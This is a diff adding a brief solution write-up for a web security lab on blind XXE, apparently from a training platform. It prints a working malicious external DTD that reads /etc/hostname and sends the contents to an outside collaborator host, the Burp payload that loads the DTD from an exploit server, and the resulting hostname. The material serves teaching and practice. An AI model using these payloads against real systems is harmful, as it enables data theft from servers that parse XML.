@@ -1,0 +1,12 @@
+Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
+Analysis: Parses XML input but does not display the result.
+Task: exfiltrate the contents of the /etc/hostname file.
+Solution:
+
+In Exploit server: <!ENTITY % file SYSTEM "file:///etc/hostname">
+                    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://nwntoi1o1t8xv1rpc8t6mb88ezkq8lwa.oastify.com/?X=%file;'>">
+                    %eval;
+                    %exfil;
+In Burp: <!DOCTYPE test [<!ENTITY % xxe SYSTEM "https://exploit-0a440098031e7570806f98d3012500dd.exploit-server.net/exploit"> %xxe; ]>
+
+Result: 62ec76f77032
